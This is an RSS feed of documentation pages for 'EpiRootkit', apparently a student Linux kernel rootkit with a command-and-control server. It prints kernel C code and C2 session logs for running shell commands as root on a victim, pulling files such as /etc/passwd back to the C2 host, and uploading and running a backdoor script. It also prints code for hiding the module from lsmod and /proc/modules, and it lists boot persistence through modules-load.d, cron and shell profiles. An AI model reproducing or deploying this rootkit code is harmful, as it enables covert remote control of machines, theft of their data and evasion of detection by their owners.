<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/04-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Tue, 27 May 2025 15:24:59 +0200</lastBuildDate><atom:link href="/docs/04-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>&lt;strong>C2 sends command&lt;/strong>: &lt;code>exec Client-1 whoami&lt;/code>&lt;/li>
&lt;li>&lt;strong>Rootkit receives&lt;/strong>: Command string via network&lt;/li>
&lt;li>&lt;strong>Executes command&lt;/strong>: Using &lt;code>call_usermodehelper()&lt;/code> with &lt;code>/bin/sh -c&lt;/code>&lt;/li>
&lt;li>&lt;strong>Captures output&lt;/strong>: Redirects stdout/stderr to temporary file&lt;/li>
&lt;li>&lt;strong>Returns result&lt;/strong>: Exit code and output back to C2&lt;/li>
&lt;/ol>
&lt;h2 id="implementation-details">Implementation Details &lt;a href="#implementation-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="execution-method">Execution Method &lt;a href="#execution-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>API&lt;/strong>: &lt;code>call_usermodehelper()&lt;/code> (kernel 5.4.0 compatible)&lt;/li>
&lt;li>&lt;strong>Shell&lt;/strong>: &lt;code>/bin/sh -c &amp;quot;command&amp;quot;&lt;/code>&lt;/li>
&lt;li>&lt;strong>Privileges&lt;/strong>: Runs with root privileges&lt;/li>
&lt;li>&lt;strong>Output capture&lt;/strong>: Temporary files in &lt;code>/tmp/epirootkit_out_*&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="limits">Limits &lt;a href="#limits" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Command length&lt;/strong>: 1024 bytes (MAX_COMMAND_LENGTH)&lt;/li>
&lt;li>&lt;strong>Output size&lt;/strong>: 64KB (MAX_OUTPUT_SIZE) with dynamic allocation&lt;/li>
&lt;li>&lt;strong>Timeout&lt;/strong>: No timeout (commands run to completion)&lt;/li>
&lt;/ul>
&lt;h2 id="usage-examples">Usage Examples &lt;a href="#usage-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="3cdec3e" class="language-bash ">
 &lt;code># System information
c2-server$ exec Client-1 whoami
# Exit code: 0
# Output:
# root

c2-server$ exec Client-1 uname -a
# Exit code: 0
# Output:
# Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="technical-implementation">Technical Implementation &lt;a href="#technical-implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="command-processing">Command Processing &lt;a href="#command-processing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="bd8b674" class="language-c ">
 &lt;code>// Simplified version of the actual implementation
static int handle_exec(const char *data)
{
 char *argv[] = { &amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, command_copy, NULL };
 char *envp[] = { 
 &amp;#34;HOME=/&amp;#34;, 
 &amp;#34;PATH=/sbin:/bin:/usr/bin:/usr/local/bin&amp;#34;, 
 &amp;#34;TERM=xterm&amp;#34;,
 NULL 
 };
 
 // Generate unique temporary filename
 snprintf(temp_filename, sizeof(temp_filename), 
 &amp;#34;/tmp/epirootkit_out_%d&amp;#34;, atomic_inc_return(&amp;amp;exec_counter));
 
 // Build command with output redirection
 snprintf(full_command, command_len &amp;#43; temp_len &amp;#43; 32,
 &amp;#34;%s &amp;gt; %s 2&amp;gt;&amp;amp;1&amp;#34;, data, temp_filename);
 
 // Execute command
 ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
 // Read output from temporary file
 // ... (file reading logic)
 
 return send_result(formatted_result);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="output-capture">Output Capture &lt;a href="#output-capture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Redirection&lt;/strong>: &lt;code>command &amp;gt; /tmp/epirootkit_out_X 2&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
&lt;li>&lt;strong>File reading&lt;/strong>: &lt;code>kernel_read()&lt;/code> to get output&lt;/li>
&lt;li>&lt;strong>Dynamic allocation&lt;/strong>: &lt;code>vmalloc()&lt;/code> for large outputs&lt;/li>
&lt;li>&lt;strong>Cleanup&lt;/strong>: Automatic temporary file removal&lt;/li>
&lt;/ul>
&lt;h2 id="security-considerations">Security Considerations &lt;a href="#security-considerations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="privileges">Privileges &lt;a href="#privileges" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Root execution&lt;/strong>: All commands run with kernel-level privileges&lt;/li>
&lt;li>&lt;strong>No sandboxing&lt;/strong>: Commands have full system access&lt;/li>
&lt;li>&lt;strong>Logging&lt;/strong>: All commands logged to kernel log via &lt;code>pr_info()&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="limitations">Limitations &lt;a href="#limitations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>No interactive commands&lt;/strong>: Cannot handle commands requiring user input&lt;/li>
&lt;/ul></description></item><item><title>File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Transfer files between the C2 server and victim system using direct content transmission.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-process">Upload Process &lt;a href="#upload-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>C2 reads local file&lt;/strong> and sends content&lt;/li>
&lt;li>&lt;strong>Rootkit receives&lt;/strong> filename and content&lt;/li>
&lt;li>&lt;strong>Creates file&lt;/strong> on victim system using &lt;code>filp_open()&lt;/code>&lt;/li>
&lt;li>&lt;strong>Writes content&lt;/strong> using &lt;code>kernel_write()&lt;/code>&lt;/li>
&lt;/ol>
&lt;h3 id="download-process">Download Process &lt;a href="#download-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>C2 requests file&lt;/strong> by path&lt;/li>
&lt;li>&lt;strong>Rootkit opens file&lt;/strong> using &lt;code>filp_open()&lt;/code>&lt;/li>
&lt;li>&lt;strong>Reads content&lt;/strong> using &lt;code>kernel_read()&lt;/code>&lt;/li>
&lt;li>&lt;strong>Sends content&lt;/strong> back to C2 server&lt;/li>
&lt;/ol>
&lt;h2 id="upload-feature">Upload Feature &lt;a href="#upload-feature" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="basic-usage">Basic Usage &lt;a href="#basic-usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="a949028" class="language-bash ">
 &lt;code># Upload file to specific path
c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt
# ✓ File uploaded successfully (1024 bytes)

# Upload to current directory (uses basename)
c2-server$ upload Client-1 ./script.sh
# ✓ File uploaded successfully (512 bytes) -&amp;gt; ./script.sh&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="implementation-details">Implementation Details &lt;a href="#implementation-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>File creation&lt;/strong>: Uses &lt;code>O_WRONLY | O_CREAT | O_TRUNC&lt;/code> flags&lt;/li>
&lt;li>&lt;strong>Permissions&lt;/strong>: Files created with 0644 permissions&lt;/li>
&lt;li>&lt;strong>Size limits&lt;/strong>: 10MB maximum file size&lt;/li>
&lt;/ul>
&lt;h2 id="download-feature">Download Feature &lt;a href="#download-feature" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="basic-usage-1">Basic Usage &lt;a href="#basic-usage-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="390b28f" class="language-bash ">
 &lt;code># Download to specific local path
c2-server$ download Client-1 /etc/passwd ./victim_passwd
# ✓ File downloaded successfully (2048 bytes)

# Download to current directory (uses basename)
c2-server$ download Client-1 /etc/hostname
# ✓ File downloaded successfully (64 bytes) -&amp;gt; ./hostname&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="real-examples">Real Examples &lt;a href="#real-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system-files">System Files &lt;a href="#system-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="72e8c6f" class="language-bash ">
 &lt;code># Download system configuration
c2-server$ download Client-1 /etc/passwd
# ✓ File downloaded successfully (2048 bytes)
# Content: root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...

# Download network configuration
c2-server$ download Client-1 /etc/hosts
# ✓ File downloaded successfully (256 bytes)
# Content: 127.0.0.1	localhost
# 127.0.1.1	victim
# ...&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="upload-scripts">Upload Scripts &lt;a href="#upload-scripts" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="170915d" class="language-bash ">
 &lt;code># Upload a shell script
c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh
# ✓ File uploaded successfully (1024 bytes)

# Make it executable (via exec command)
c2-server$ exec Client-1 chmod &amp;#43;x /tmp/backdoor.sh
# Exit code: 0

# Run the script
c2-server$ exec Client-1 /tmp/backdoor.sh
# Exit code: 0
# Output: Backdoor installed successfully&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="technical-implementation">Technical Implementation &lt;a href="#technical-implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-handler">Upload Handler &lt;a href="#upload-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="66de7a3" class="language-c ">
 &lt;code>static int handle_upload(const char *data)
{
 char *filename, *file_content, *separator;
 struct file *file;
 loff_t pos = 0;
 ssize_t bytes_written;
 
 // Parse filename:content format
 separator = strchr(data, &amp;#39;:&amp;#39;);
 *separator = &amp;#39;\0&amp;#39;;
 filename = data;
 file_content = separator &amp;#43; 1;
 
 // Validate filename
 if (!validate_filename(filename))
 return send_error(&amp;#34;Invalid or unsafe filename&amp;#34;);
 
 // Create and write file
 file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 bytes_written = kernel_write(file, file_content, content_length, &amp;amp;pos);
 filp_close(file, NULL);
 
 return send_success(&amp;#34;File uploaded successfully&amp;#34;);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="download-handler">Download Handler &lt;a href="#download-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="5d2c29c" class="language-c ">
 &lt;code>static int handle_download(const char *data)
{
 struct file *file;
 loff_t file_size, pos = 0;
 char *file_content, *result_buffer;
 ssize_t bytes_read;
 
 // Open file
 file = filp_open(data, O_RDONLY, 0);
 if (IS_ERR(file))
 return send_error(&amp;#34;File not found or cannot be opened&amp;#34;);
 
 // Check file size
 file_size = i_size_read(file_inode(file));
 if (file_size &amp;gt; MAX_FILE_SIZE) {
 filp_close(file, NULL);
 return send_error(&amp;#34;File too large to download&amp;#34;);
 }
 
 // Read file content
 file_content = vmalloc(file_size &amp;#43; 1);
 bytes_read = kernel_read(file, file_content, file_size, &amp;amp;pos);
 file_content[bytes_read] = &amp;#39;\0&amp;#39;;
 
 // Format response
 result_buffer = vmalloc(file_size &amp;#43; 32);
 snprintf(result_buffer, file_size &amp;#43; 32, &amp;#34;DOWNLOAD:%s&amp;#34;, file_content);
 
 return send_result(result_buffer);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="f8baefd" class="language-c ">
 &lt;code>// rootkit/core/config.h
#define MAX_FILE_SIZE (10 * 1024 * 1024) // 10MB
#define MAX_FILENAME_LENGTH 255&lt;/code>
 &lt;/pre>
 &lt;/div></description></item><item><title>Stealth &amp; Hiding</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h1 id="stealth--hiding">Stealth &amp;amp; Hiding &lt;a href="#stealth--hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module and files from system detection using kernel hooking techniques.&lt;/p>
&lt;h2 id="what-we-implemented">What We Implemented &lt;a href="#what-we-implemented" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Hide from &lt;code>lsmod&lt;/code>&lt;/strong>: Remove module from kernel module list&lt;/li>
&lt;li>&lt;strong>Hide from &lt;code>/proc/modules&lt;/code>&lt;/strong>: Module not visible in procfs&lt;/li>
&lt;li>&lt;strong>Dynamic control&lt;/strong>: Toggle visibility via C2 commands&lt;/li>
&lt;/ul>
&lt;h3 id="file-hiding">File Hiding &lt;a href="#file-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Hide by prefix&lt;/strong>: Files with specific prefixes are hidden&lt;/li>
&lt;li>&lt;strong>Directory listing&lt;/strong>: Intercept &lt;code>getdents64&lt;/code> syscall&lt;/li>
&lt;li>&lt;strong>Automatic hiding&lt;/strong>: Enabled by default when module loads&lt;/li>
&lt;/ul>
&lt;h2 id="module-hiding-1">Module Hiding &lt;a href="#module-hiding-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>Find module&lt;/strong>: Locate rootkit in kernel module list&lt;/li>
&lt;li>&lt;strong>Remove from list&lt;/strong>: Use &lt;code>list_del()&lt;/code> to remove from &lt;code>modules&lt;/code> list&lt;/li>
&lt;li>&lt;strong>Store reference&lt;/strong>: Keep pointer to restore later&lt;/li>
&lt;li>&lt;strong>Toggle visibility&lt;/strong>: Can hide/unhide dynamically&lt;/li>
&lt;/ol>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="c21c383" class="language-c ">
 &lt;code>int hide_module(void)
{
 struct module *mod;
 
 mutex_lock(&amp;amp;module_mutex);
 list_for_each_entry(mod, &amp;amp;modules, list) {
 if (mod == THIS_MODULE) {
 stealth_state.prev_module_entry = mod-&amp;gt;list.prev;
 list_del(&amp;amp;mod-&amp;gt;list);
 stealth_state.module_hidden = true;
 break;
 }
 }
 mutex_unlock(&amp;amp;module_mutex);
 return 0;
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="18156bf" class="language-bash ">
 &lt;code># Hide the module
c2-server$ config Client-1
# Select: Toggle Module Hiding
# ✓ Module hidden

# Verify hiding (from victim system)
victim$ lsmod | grep epirootkit
# (no output - module is hidden)

# Check status
c2-server$ status Client-1
# Module Hidden: YES&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="detection-evasion">Detection Evasion &lt;a href="#detection-evasion" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>&lt;code>lsmod&lt;/code> command&lt;/strong>: Module not listed&lt;/li>
&lt;li>&lt;strong>&lt;code>/proc/modules&lt;/code>&lt;/strong>: Entry removed from procfs&lt;/li>
&lt;li>&lt;strong>System monitoring&lt;/strong>: Most tools rely on these sources&lt;/li>
&lt;/ul>
&lt;h2 id="file-hiding-1">File Hiding &lt;a href="#file-hiding-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works-1">How It Works &lt;a href="#how-it-works-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>Hook &lt;code>getdents64&lt;/code>&lt;/strong>: Use kretprobe to intercept directory listings&lt;/li>
&lt;li>&lt;strong>Filter entries&lt;/strong>: Remove files with configured prefixes&lt;/li>
&lt;li>&lt;strong>Modify buffer&lt;/strong>: Adjust directory entry buffer&lt;/li>
&lt;li>&lt;strong>Return filtered&lt;/strong>: Send modified listing to userspace&lt;/li>
&lt;/ol>
&lt;h3 id="hidden-file-prefixes">Hidden File Prefixes &lt;a href="#hidden-file-prefixes" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Files starting with these prefixes are automatically hidden:&lt;/p></description></item><item><title>Persistence</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.&lt;/p>
&lt;h2 id="what-we-implemented">What We Implemented &lt;a href="#what-we-implemented" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="three-persistence-mechanisms">Three Persistence Mechanisms &lt;a href="#three-persistence-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>modules-load.d&lt;/strong>: Systemd automatic module loading&lt;/li>
&lt;li>&lt;strong>Cron Jobs&lt;/strong>: Scheduled module loading via cron&lt;/li>
&lt;li>&lt;strong>Shell Profiles&lt;/strong>: Load via user login scripts&lt;/li>
&lt;/ol>
&lt;h3 id="automatic-installation">Automatic Installation &lt;a href="#automatic-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>On module load&lt;/strong>: All persistence mechanisms installed automatically&lt;/li>
&lt;li>&lt;strong>Dynamic control&lt;/strong>: Install/remove via C2 commands&lt;/li>
&lt;li>&lt;strong>Individual control&lt;/strong>: Manage each mechanism separately&lt;/li>
&lt;/ul>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-installation-1">Automatic Installation &lt;a href="#automatic-installation-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically installs all persistence mechanisms:&lt;/p></description></item></channel></rss>